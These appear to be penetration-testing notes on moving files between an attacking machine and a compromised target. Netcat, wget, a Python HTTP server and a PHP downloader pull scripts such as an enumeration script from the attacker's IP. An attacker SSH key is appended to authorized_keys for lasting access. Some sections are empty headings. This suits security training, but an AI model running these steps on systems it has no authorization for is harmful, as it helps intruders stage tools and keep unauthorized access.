# Transfering files

## Linux

### Netcat
The easiest way normally is to use netcat. 

If you can't have an interactive shell it might be risky to start listening on a on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because  that will destroy your sessions.

So instead you can connect from the target machine like this.

On attacking machine:
```bash
nc -lvp 4444 < file
```
On target machine:

```bash
nc 192.168.1.102 4444 > file
```

You can of course also do it the other way around:

So on the victim-machine we run nc like this:
```bash
nc -lvp 3333 > enum.sh
```

And on the attacking machine we send the file like this:

```bash
nc 192.168.1.103 < enum.sh
```

I have sometimes recieved this error:

```
This is nc from the netcat-openbsd package. An alternative nc is available
```

I have just run this command instead:

```
nc -l 1234 > file.sh
```

### SSH
If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.

So, in the /home/user dir you can find the hidden `.ssh` files by typing `ls -la`.
Then you need to do two things.

1. Create a new keypair.
You do that with: `ssh-keygen -t rsa -C "your_email@example.com"` then you enter a name for the key.

Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: `

This will create two files, one called *nameOfMyKey* and another called *nameOfMyKey_pub*. The one with the *_pub* is of course your public key. And the other key is your private.

2. Add your public key to authorized_keys.
Now you copy the content of *nameOfMyKey_pub*. 
On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized_keys. Like this 

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
```

3. Log in.
Now you should be all set to log in using your private key. Like this

```
ssh -i nameOfMyKey kim@192.168.1.103
```


### Wget

### Python server

Fire up a simple server on the attacking box. This command will make the entire folder available.
```
python -m SimpleHTTPServer 9999
```

Now you can download any file with curl or wget
```
wget 192.168.1.102:9999/file.txt
```

### With php

```
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

###ftp

## Windows
On windows machines we do not have access to tools like wget and netcat. But if you have a way to transfer files already we can transfer wget and other tools. Here are the minaries in kali.

**/usr/share/windows-binaries
/usr/share/doc/windows-binaries**

